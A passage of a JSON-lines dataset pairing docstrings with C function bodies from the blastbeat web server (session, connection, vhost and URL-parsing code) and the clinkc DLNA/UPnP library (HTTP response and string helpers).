&bbc->reader.reader);\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// the healthcheck system\n", "func_signal": "static void pinger_cb(struct ev_loop *loop, struct ev_timer *w, int revents)", "code": "{\n\n\tstruct bb_dealer *bbd = blastbeat.dealers;\n\t// get events before starting a potentially long write session\n\tstruct bb_router *bbr = blastbeat.routers;\n\twhile(bbr) {\n\t\tev_feed_event(blastbeat.loop, &bbr->zmq_io.event, EV_READ);\n\t\tbbr = bbr->next;\n\t}\n\n\tev_tstamp now = bb_now;\n\twhile(bbd) {\n\t\tev_tstamp delta = now - bbd->last_seen;\n\t\tif (delta >= blastbeat.ping_freq) {\n\t\t\tif (delta > (blastbeat.ping_freq * 3) && bbd->status == BLASTBEAT_DEALER_AVAILABLE) {\n\t\t\t\tbbd->status = BLASTBEAT_DEALER_OFF;\n\t\t\t\tfprintf(stderr,\"node \\\"%s\\\" is OFF\\n\", bbd->identity);\n\t\t\t}\n\t\t\tbb_raw_zmq_send_msg(bbd, NULL, \"\", 0, \"ping\", 4, \"\", 0);\n\t\t}\n\t\tif (!bbd->spawn_sent) {\n\t\t\tbb_raw_zmq_send_msg(bbd, NULL, \"\", 0, \"spawn\", 5, \"\", 0);\n\t\t\tbbd->spawn_sent = 1;\n\t\t}\n\t\tbbd = bbd->next;\n\t}\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// this allocates memory for caching too\n", "func_signal": "static void bb_vhosts_fix()", "code": "{\n\n\tstruct bb_virtualhost *vhosts = blastbeat.vhosts;\n\twhile(vhosts) {\n\t\tstruct bb_vhost_acceptor *acceptor = vhosts->acceptors;\n\t\twhile(acceptor) {\n\t\t\tbb_acceptor_push_vhost(acceptor->acceptor, vhosts);\n\t\t\tacceptor = acceptor->next;\n\t\t}\n\t\tif (vhosts->cache_size > 0) {\n\t\t\tvhosts->cht_size = 65536;\n\t\t\tvhosts->cache = bb_alloc(sizeof(struct bb_cache_entry) * vhosts->cht_size);\n\t\t\tif (!vhosts->cache) {\n\t\t\t\tbb_error_exit(\"unable to allocate memory for caching: malloc()\\n\");\n\t\t\t}\n\t\t\tmemset(vhosts->cache, 0, sizeof(struct bb_cache_entry) * vhosts->cht_size);\n\t\t}\n\n\t\tif (vhosts->bandwidth > 0) {\n\t\t\t// start filling the token bucket (30ms frequency);\n\t\t\tev_timer_init(&vhosts->throttle.throttle, bb_throttle_cb, BB_TOKEN_BUCKET_SPEED, BB_TOKEN_BUCKET_SPEED);\n\t\t\tvhosts->throttle.vhost = vhosts;\n\t\t\tev_timer_start(blastbeat.loop, &vhosts->throttle.throttle);\n\t\t}\n\t\tvhosts = vhosts->next;\n\t}\n\n\t// now push all of the shared acceptors to virtualhosts with empty acceptors list\n\tvhosts = blastbeat.vhosts;\n\twhile(vhosts) {\n\t\tif (!vhosts->acceptors) {\n\t\t\tstruct bb_acceptor *acceptor = blastbeat.acceptors;\n\t\t\twhile(acceptor) {\n\t\t\t\tif (acceptor->shared) {\n\t\t\t\t\tbb_acceptor_push_vhost(acceptor, vhosts);\n\t\t\t\t\t// attach teh acceptor to the virtualhost too\n\t\t\t\t\tbb_vhost_push_acceptor(vhosts, acceptor);\n\t\t\t\t}\n\t\t\t\tacceptor = acceptor->next;\n\t\t\t}\n\t\t}\n\t\tvhosts = vhosts->next;\n\t}\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// get a vhost by hostname\n", "func_signal": "struct bb_virtualhost *bb_vhost_get(char *name, size_t len, struct bb_hostname **hostname)", "code": "{\n\n        uint32_t hnht_pos = djb2_hash_hostname(name, len);\n        struct bb_hostname *bbhn = blastbeat.hnht[hnht_pos];\n        while(bbhn) {\n                if (bb_hostname_compare(bbhn, name, len)) {\n\t\t\tif (hostname) {\n\t\t\t\t*hostname = bbhn;\n\t\t\t}\n                        return bbhn->vhost;\n                }\n                bbhn = bbhn->next;\n        };\n        return NULL;\n}", "path": "src\\config.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*\n\nclosing a connection means freeing/stopping the write queue and destroying all of the associated (non-persistent) sessions\n\nconnection close is triggered:\n\twhen the client closes the connection\n\ton network/protocol error\n\ton non-HTTP/1.1 sessions end\n*/\n", "func_signal": "void bb_connection_close(struct bb_connection *bbc)", "code": "{\n\n\t// a connection could be null (for persistent sessions...)\n\tif (!bbc) return;\n\n\t// stop the timer\n\tev_timer_stop(blastbeat.loop, &bbc->timeout);\n\t// stop I/O\n\tev_io_stop(blastbeat.loop, &bbc->reader.reader);\n\tev_io_stop(blastbeat.loop, &bbc->writer.writer);\n\t// stop throttling\n\tev_prepare_stop(blastbeat.loop, &bbc->throttle.throttle);\n\t// clear SSL if required\n\tif (bbc->ssl) {\n\t\t// this should be better managed, but why wasting resources ?\n\t\t// just ignore its return value\n\t\tSSL_shutdown(bbc->ssl);\n\t\tSSL_free(bbc->ssl);\n\t}\n\t// close the socket\n\tclose(bbc->fd);\n\n\t// free SPDY resources\n\tif (bbc->spdy) {\n\t\tdeflateEnd(&bbc->spdy_z_in);\n\t\tdeflateEnd(&bbc->spdy_z_out);\n\t}\n\n\t// close sessions\t\n\tstruct bb_session *next_bbs, *bbs = bbc->sessions_head;\n\twhile(bbs) {\n\t\tnext_bbs = bbs->conn_next;\n\t\tbb_session_close(bbs);\n\t\tbbs = next_bbs;\n\t}\n\n\t// remove the writer queue\n\t// no fear of it as the write callback is stopped\n\tstruct bb_writer_item *bbwi = bbc->writer.head;\n\twhile(bbwi) {\n\t\tstruct bb_writer_item *old_bbwi = bbwi;\t\n\t\tbbwi = bbwi->next;\n\t\tif ((old_bbwi->flags & BB_WQ_FREE) && old_bbwi->len > 0) {\n\t\t\tbb_free(old_bbwi->buf, old_bbwi->len);\n\t\t}\n\t\tbb_free(old_bbwi, sizeof(struct bb_writer_item));\n\t}\n\n\tbb_free(bbc, sizeof(struct bb_connection));\n\tblastbeat.active_connections--;\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*\n\nadd vhosts to acceptors\n\n*/\n", "func_signal": "static void bb_acceptor_push_vhost(struct bb_acceptor *acceptor, struct bb_virtualhost *vhost)", "code": "{\n\tstruct bb_acceptor_vhost *last_vhost=NULL,*vhosts = acceptor->vhosts;\n\twhile(vhosts) {\n\t\tif (vhosts->vhost == vhost)\n\t\t\treturn;\n\t\tlast_vhost = vhosts;\n\t\tvhosts = vhosts->next;\n\t}\n\n\tvhosts = bb_alloc(sizeof(struct bb_acceptor_vhost));\n\tif (!vhosts) {\n\t\tbb_error_exit(\"malloc()\");\n\t}\n\tvhosts->vhost = vhost;\n\tvhosts->next = NULL;\n\n\tif (last_vhost) {\n\t\tlast_vhost->next = vhosts;\n\t}\n\telse {\n\t\tacceptor->vhosts = vhosts;\n\t}\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// add the hostname to the hostnames hash\n", "func_signal": "static int bb_hostname_add(char *name, size_t len, struct bb_virtualhost *vhost)", "code": "{\n\n\tstruct bb_virtualhost *already = bb_vhost_get(name, len, NULL);\n\tif (already) {\n\t\tfprintf(stderr,\"!!! hostname \\\"%.*s\\\" is already configured for virtualhost \\\"%.*s\\\" !!!\\n\", (int) len, name, (int) already->len, already->name);\n\t\treturn -1;\n\t}\n        // get the hash\n        uint32_t hnht_pos = djb2_hash_hostname(name, len);\n        // get the first hostname\n        struct bb_hostname *bbhn_last = NULL,*bbhn = blastbeat.hnht[hnht_pos];\n\twhile(bbhn) {\n\t\tbbhn_last = bbhn;\n\t\tbbhn = bbhn->next;\n\t}\n\t\n        bbhn = bb_alloc(sizeof(struct bb_hostname));\n        if (!bbhn) {\n                bb_error_exit(\"unable to allocate memory for hostname: malloc()\");\n        }\n        bbhn->name = name;\n        bbhn->len = len;\n        bbhn->vhost = vhost;\n        bbhn->next = NULL;\n\n        if (bbhn_last) {\n\t\tbbhn_last->next = bbhn;\n        }\n        else {\n\t\tblastbeat.hnht[hnht_pos] = bbhn;\n        }\n\n\treturn 0;\n}", "path": "src\\config.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*\n\n\t--- BlastBeat sessions ---\n\na persistent session is not removed from the hashtable, but a timer is\nattached to it. The timer is reset whenever some kind of activity is triggered on the sessions.\nIf the timeout expires, the sessions is definitely removed.\n\nPAY ATTENTION:\n\npersistent sessions can be without a related connection\npersistent sessions get the request/response datas cleared after each usage\n\n*/\n", "func_signal": "void bb_session_close(struct bb_session *bbs)", "code": "{\n\tstruct bb_connection *bbc = bbs->connection;\n\n\tif (!bbs->persistent) {\n\t\t// stop the death timer before destrying the session\n\t\tev_timer_stop(blastbeat.loop, &bbs->death_timer);\n                bb_sht_remove(bbs);\n\t}\n\n        // clear the HTTP request structure\n        bb_initialize_request(bbs);\n\n\t// clear the HTTP response structure\n\tbb_initialize_response(bbs);\n\n\t// clear dynamic memory areas (if required)\n\tif (bbs->push_queue) {\n\t\tbb_free(bbs->push_queue, bbs->push_queue_len);\n\t}\n\n        // remove groups and pipes (if not persistent)\n        if (!bbs->persistent) {\n                struct bb_session_group *bbsg = bbs->groups;\n                while(bbsg) {\n                        struct bb_session_group *current_bbsg = bbsg;\n                        bbsg = bbsg->next;\n                        bb_session_leave_group(bbs, current_bbsg->group);\n                }\n\n\t\tstruct bb_pipe *bbp = bbs->pipes_head;\n\t\twhile(bbp) {\n\t\t\tstruct bb_pipe *bbp_next = bbp->next;\n\t\t\tbb_free(bbp, sizeof(struct bb_pipe));\n\t\t\tbbp = bbp_next;\n\t\t}\n\n                // if linked to a dealer (and not in stealth mode), send a 'end' message\n                if (bbs->dealer && !bbs->stealth) {\n                        bb_zmq_send_msg(bbs->dealer, bbs, (char *) &bbs->uuid_part1, BB_UUID_LEN, \"end\", 3, \"\", 0);\n                }\n        }\n\n\t// detaching the session for the related connection\n\tif (!bbc) goto clear;\n\n\t// first one ?\n\tif (bbs == bbc->sessions_head) {\n\t\tbbc->sessions_head = bbs->conn_next;\n\t}\n\t// last one ?\n\tif (bbs == bbc->sessions_tail) {\n\t\tbbc->sessions_tail = bbs->conn_prev;\n\t}\n\n\tif (bbs->conn_prev) {\n\t\tbbs->conn_prev->next = bbs->conn_next;\n\t}\n\n\tif (bbs->conn_next) {\n\t\tbbs->conn_next->prev = bbs->conn_prev;\n\t}\n\n\tbbs->connection = NULL;\n\tbbs->conn_prev = NULL;\n\tbbs->conn_next = NULL;\n\nclear:\n\n\tif (!bbs->persistent)\n\t\tbb_free(bbs, sizeof(struct bb_session));\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// websocket request spawns from http one\n", "func_signal": "int bb_websocket_func(struct bb_connection *bbc, char *buf, size_t len)", "code": "{\n\t// remember: in HTTP mode, only one session is allowed\n\tif (!bbc->sessions_head) {\n\t\tfprintf(stderr,\"BUG bbc->sessions_head is NULL !!!\\n\");\n\t\treturn -1;\n\t}\n\treturn bb_manage_websocket(bbc->sessions_head, buf, len);\n}", "path": "src\\websocket.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// currently it only prints the number of active sessions and connections\n", "func_signal": "static void stats_cb(struct ev_loop *loop, struct ev_timer *w, int revents)", "code": "{\n\tuint64_t running_memory = blastbeat.allocated_memory-(blastbeat.startup_memory+blastbeat.cache_memory);\n\tfprintf(stderr,\"active sessions: %llu active connections %llu running memory: %llu (%lluMB) cache memory: %llu (%lluMB) total memory: %lluMB\\n\", (unsigned long long) blastbeat.active_sessions, \n\t\t(unsigned long long) blastbeat.active_connections,\n\t\t(unsigned long long) running_memory,\n\t\t(unsigned long long) running_memory/1024/1024,\n\t\t(unsigned long long) blastbeat.cache_memory,\n\t\t(unsigned long long) blastbeat.cache_memory/1024/1024,\n\t\t(unsigned long long) blastbeat.allocated_memory/1024/1024);\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "/* Our URL parser.\n *\n * This is designed to be shared by http_parser_execute() for URL validation,\n * hence it has a state transition + byte-for-byte interface. In addition, it\n * is meant to be embedded in http_parser_parse_url(), which does the dirty\n * work of turning state transitions URL components for its API.\n *\n * This function should only be invoked with non-space characters. It is\n * assumed that the caller cares about (and can detect) the transition between\n * URL and non-URL states by looking for these.\n */\n", "func_signal": "static enum state\nparse_url_char(enum state s, const char ch)", "code": "{\n  if (ch == ' ' || ch == '\\r' || ch == '\\n') {\n    return s_dead;\n  }\n\n#if HTTP_PARSER_STRICT\n  if (ch == '\\t' || ch == '\\f') {\n    return s_dead;\n  }\n#endif\n\n  switch (s) {\n    case s_req_spaces_before_url:\n      /* Proxied requests are followed by scheme of an absolute URI (alpha).\n       * All methods except CONNECT are followed by '/' or '*'.\n       */\n\n      if (ch == '/' || ch == '*') {\n        return s_req_path;\n      }\n\n      if (IS_ALPHA(ch)) {\n        return s_req_schema;\n      }\n\n      break;\n\n    case s_req_schema:\n      if (IS_ALPHA(ch)) {\n        return s;\n      }\n\n      if (ch == ':') {\n        return s_req_schema_slash;\n      }\n\n      break;\n\n    case s_req_schema_slash:\n      if (ch == '/') {\n        return s_req_schema_slash_slash;\n      }\n\n      break;\n\n    case s_req_schema_slash_slash:\n      if (ch == '/') {\n        return s_req_server_start;\n      }\n\n      break;\n\n    case s_req_server_with_at:\n      if (ch == '@') {\n        return s_dead;\n      }\n\n    /* FALLTHROUGH */\n    case s_req_server_start:\n    case s_req_server:\n      if (ch == '/') {\n        return s_req_path;\n      }\n\n      if (ch == '?') {\n        return s_req_query_string_start;\n      }\n\n      if (ch == '@') {\n        return s_req_server_with_at;\n      }\n\n      if (IS_USERINFO_CHAR(ch) || ch == '[' || ch == ']') {\n        return s_req_server;\n      }\n\n      break;\n\n    case s_req_path:\n      if (IS_URL_CHAR(ch)) {\n        return s;\n      }\n\n      switch (ch) {\n        case '?':\n          return s_req_query_string_start;\n\n        case '#':\n          return s_req_fragment_start;\n      }\n\n      break;\n\n    case s_req_query_string_start:\n    case s_req_query_string:\n      if (IS_URL_CHAR(ch)) {\n        return s_req_query_string;\n      }\n\n      switch (ch) {\n        case '?':\n          /* allow extra '?' in query string */\n          return s_req_query_string;\n\n        case '#':\n          return s_req_fragment_start;\n      }\n\n      break;\n\n    case s_req_fragment_start:\n      if (IS_URL_CHAR(ch)) {\n        return s_req_fragment;\n      }\n\n      switch (ch) {\n        case '?':\n          return s_req_fragment;\n\n        case '#':\n          return s;\n      }\n\n      break;\n\n    case s_req_fragment:\n      if (IS_URL_CHAR(ch)) {\n        return s;\n      }\n\n      switch (ch) {\n        case '?':\n        case '#':\n          return s;\n      }\n\n      break;\n\n    default:\n      break;\n  }\n\n  /* We should never fall out of the switch above unless there's an error */\n  return s_dead;\n}", "path": "http-parser\\http_parser.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// each session has a response structure, this strcture can be cleared multiple times\n", "func_signal": "void bb_initialize_response(struct bb_session *bbs)", "code": "{\n\n\tif (bbs->response.headers)\n\t\tbb_free(bbs->response.headers, sizeof(struct bb_http_header)*bbs->response.headers_count);\n\n\tif (bbs->response.initialized) {\n\t\tmemset(&bbs->response, 0, sizeof(struct bb_response));\n\t}\n\n\thttp_parser_init(&bbs->response.parser, HTTP_RESPONSE);\n        bbs->response.parser.data = bbs;\n\tbbs->response.last_was_value = 1;\n\n\tbbs->response.initialized = 1;\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// scan the list of bb_pipe structures and forward them if matches\n", "func_signal": "int bb_check_for_pipe(struct bb_session *bbs, char *msg_type, size_t msg_type_len, char *buf, size_t len)", "code": "{\n\tint ret = 0;\n\tstruct bb_pipe *bbp = bbs->pipes_head;\n\twhile(bbp) {\n\t\tif (!bb_strcmp(msg_type, msg_type_len, \"websocket\", 9) && bbp->on_websocket) {\n\t\t\tret = 1;\n\t\t\tbb_pipe_websocket_to(bbp, buf, len);\t\t\t\n\t\t\tgoto next;\n\t\t}\n\t\tif (!bb_strcmp(msg_type, msg_type_len, \"body\", 4) && bbp->on_body) {\n                        ret = 1;\n                        bb_pipe_body_to(bbp, buf, len);\n                        goto next;\n                }\nnext:\n\t\tbbp = bbp->next;\n\t}\n\t\n\treturn ret;\n}", "path": "src\\pipe.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "/****************************************\n* cg_http_response_getversion\n****************************************/\n", "func_signal": "char *cg_http_response_getversion(CgHttpResponse *httpRes)", "code": "{\n\tcg_log_debug_l4(\"Entering...\\n\");\n\n\treturn cg_string_getvalue(httpRes->version);\n\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\http\\chttp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_http_response_print\n****************************************/\n", "func_signal": "void cg_http_response_print(CgHttpResponse *httpRes)", "code": "{\n\tcg_log_debug_l4(\"Entering...\\n\");\n\t\n\tcg_log_debug_s(\"%s %d %s\\n\",\n\t\tcg_http_response_getversion(httpRes),\n\t\tcg_http_response_getstatuscode(httpRes),\n\t\tcg_http_response_getreasonphrase(httpRes));\n\n\tcg_http_packet_print((CgHttpPacket *)httpRes);\n\t\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\http\\chttp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_naddrep\n****************************************/\n", "func_signal": "char *cg_string_naddrepvalue(CgString *str, char *value, int valueLen, int repeatCnt)", "code": "{\n\tint n;\n\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tfor (n = 0; n < repeatCnt; n++)\n\t\tcg_string_naddvalue(str, value, valueLen);\n\n\tcg_log_debug_l5(\"Leaving...\\n\");\n\n\treturn cg_string_getvalue(str);\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_add\n****************************************/\n", "func_signal": "char *cg_string_addvalue(CgString *str, char *value)", "code": "{\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tcg_log_debug_l5(\"Leaving...\\n\");\n\n\treturn cg_string_naddvalue(str, value, cg_strlen(value));\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_getvalue\n****************************************/\n", "func_signal": "char *cg_string_getvalue(CgString *str)", "code": "{\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tcg_log_debug_l5(\"Leaving...\\n\");\n\n\treturn (NULL != str) ? str->value : NULL;\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_upnp_ssdpresponse_new\n****************************************/\n", "func_signal": "CgUpnpSSDPResponse *cg_upnp_ssdpresponse_new()", "code": "{\n\tCgUpnpSSDPResponse*ssdpRes;\n\n\tcg_log_debug_l4(\"Entering...\\n\");\n\n\tssdpRes = cg_http_response_new();\n\t\n\tcg_http_response_setversion(ssdpRes, CG_HTTP_VER11);\n\tcg_http_response_setstatuscode(ssdpRes, CG_HTTP_STATUS_OK);\n\n\treturn ssdpRes;\n\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\upnp\\ssdp\\cssdp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_new\n****************************************/\n", "func_signal": "CgString *cg_string_new()", "code": "{\n\tCgString *str;\n\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tstr = (CgString *)malloc(sizeof(CgString));\n\n\tif (NULL != str) {\n\t\tstr->value = NULL;\n\t\tstr->memSize = 0;\n\t\tstr->valueSize = 0;\n\t}\n\n\tcg_log_debug_l5(\"Leaving...\\n\");\n\n\treturn str;\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_http_response_setreasonphrase\n****************************************/\n", "func_signal": "void cg_http_response_setreasonphrase(CgHttpResponse *httpRes, char *value)", "code": "{\n\tcg_log_debug_l4(\"Entering...\\n\");\n\n\tcg_string_setvalue(httpRes->reasonPhrase, value);\n\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\http\\chttp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_http_response_delete\n****************************************/\n", "func_signal": "void cg_http_response_delete(CgHttpResponse *httpRes)", "code": "{\n\tcg_log_debug_l4(\"Entering...\\n\");\n\n\tcg_http_packet_clean((CgHttpPacket *)httpRes);\n\tcg_string_delete(httpRes->version);\n\tcg_string_delete(httpRes->reasonPhrase);\n\tfree(httpRes);\n\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\http\\chttp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_setnvalue\n****************************************/\n", "func_signal": "void cg_string_setnvalue(CgString *str, char *value, int len)", "code": "{\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tif (NULL != str) {\n\t\tcg_string_clear(str);\n\t\tif (value != NULL) {\n\t\t\tstr->valueSize = len;\n\t\t\tstr->memSize = str->valueSize + 1;\n\t\t\tstr->value = (char *)malloc(str->memSize * sizeof(char));\n\n\t\t\tif ( NULL == str->value ) {\n\t\t\t\tcg_log_debug_s(\"Memory allocation failure!\\n\");\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\t/* memcpy works better with non-zero-terminated data than strncpy */\n\t\t\tmemcpy(str->value, value, len);\n\t\t\tstr->value[len] = '\\0';\n\t\t}\n\t}\n\n\tcg_log_debug_l5(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_http_response_clear\n****************************************/\n", "func_signal": "void cg_http_response_clear(CgHttpResponse *httpRes)", "code": "{\n\tcg_log_debug_l4(\"Entering...\\n\");\n\n\tcg_http_packet_clear((CgHttpPacket *)httpRes);\n\tcg_http_response_setversion(httpRes, NULL);\n\tcg_http_response_setstatuscode(httpRes, CG_HTTP_STATUS_INTERNAL_SERVER_ERROR);\n\tcg_http_response_setreasonphrase(httpRes, NULL);\n\tcg_http_response_setuserdata(httpRes, NULL);\n\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\http\\chttp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_http_response_setstatuscode\n****************************************/\n", "func_signal": "void cg_http_response_setstatuscode(CgHttpResponse *httpRes, int value)", "code": "{\n\tcg_log_debug_l4(\"Entering...\\n\");\n\n\thttpRes->statusCode = value;\n\tcg_http_response_setreasonphrase(httpRes,\n\t\t\t(char*) cg_http_statuscode2reasonphrase(value));\n\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\http\\chttp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_setvalue\n****************************************/\n", "func_signal": "void cg_string_setvalue(CgString *str, char *value)", "code": "{\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tif (NULL != str) {\n\t\tif (value != NULL)\n\t\t\tcg_string_setnvalue(str, value, cg_strlen(value));\n\t}\n\t\n\tcg_log_debug_l5(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_setintvalue\n****************************************/\n", "func_signal": "void cg_string_setintvalue(CgString *str, int value)", "code": "{\n\tchar buf[CG_STRING_INTEGER_BUFLEN];\n\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tcg_string_setvalue(str, cg_int2str(value, buf, sizeof(buf)));\n\n\tcg_log_debug_l5(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_replace\n****************************************/\n", "func_signal": "char *cg_string_replace(CgString *str, char *fromStr[], char *toStr[], int fromStrCnt)", "code": "{\n\tchar *orgValue = NULL;\n\tint orgValueLen = 0;\n\tint n = 0;\n\tint copyPos = 0;\n\tint *fromStrLen = NULL;\n\tCgString *repValue = NULL;\n\tBOOL isReplaced = FALSE;\n\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tif (NULL == str )\n\t\treturn NULL;\n\t\n\trepValue = cg_string_new();\n\t\n\tfromStrLen = (int *)malloc(sizeof(int) * fromStrCnt);\n\n\tif ( NULL == fromStrLen )\n\t{\n\t\tcg_log_debug_s(\"Memory allocation failure!\\n\");\n\t\treturn NULL;\n\t}\n\t\n\tfor (n=0; n<fromStrCnt; n++)\n\t\tfromStrLen[n] = cg_strlen(fromStr[n]);\n\t\n\torgValue = cg_string_getvalue(str);\n\torgValueLen = cg_string_length(str);\n\t\n\tcopyPos = 0;\n\twhile (copyPos<orgValueLen) {\n\t\tisReplaced = FALSE;\n\t\tfor (n=0; n<fromStrCnt; n++) {\n\t\t\tif (strncmp(fromStr[n], orgValue + copyPos,  fromStrLen[n]) == 0) {\n\t\t\t\tcg_string_addvalue(repValue, toStr[n]);\n\t\t\t\tcopyPos += fromStrLen[n];\n\t\t\t\tisReplaced = TRUE;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\t\tif (isReplaced == TRUE)\n\t\t\tcontinue;\n\t\tcg_string_naddvalue(repValue, orgValue + copyPos, 1);\n\t\tcopyPos++;\n\t}\n\t\n\tfree(fromStrLen);\n\n\tcg_string_setvalue(str, cg_string_getvalue(repValue));\t\n\n\tcg_string_delete(repValue);\n\t\t\n\tcg_log_debug_l5(\"Leaving...\\n\");\n\n\treturn cg_string_getvalue(str);\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_http_response_getstatuscode\n****************************************/\n", "func_signal": "int cg_http_response_getstatuscode(CgHttpResponse *httpRes)", "code": "{\n\tcg_log_debug_l4(\"Entering...\\n\");\n\n\treturn httpRes->statusCode;\n\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\http\\chttp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_getmemorysize\n****************************************/\n", "func_signal": "int cg_string_getmemorysize(CgString *str)", "code": "{\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tif (NULL == str)\n\t\treturn 0;\n\n\tcg_log_debug_l5(\"Leaving...\\n\");\n\n\treturn str->memSize;\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_string_addrep\n****************************************/\n", "func_signal": "char *cg_string_addrepvalue(CgString *str, char *value, int repeatCnt)", "code": "{\n\tint n;\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tfor (n = 0; n < repeatCnt; n++)\n\t\tcg_string_addvalue(str, value);\n\n\tcg_log_debug_l5(\"Leaving...\\n\");\n\n\treturn cg_string_getvalue(str);\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/****************************************\n* cg_http_response_getreasonphrase\n****************************************/\n", "func_signal": "char *cg_http_response_getreasonphrase(CgHttpResponse *httpRes)", "code": "{\n\tcg_log_debug_l4(\"Entering...\\n\");\n\n\treturn cg_string_getvalue(httpRes->reasonPhrase);\n\n\tcg_log_debug_l4(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\http\\chttp_response.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
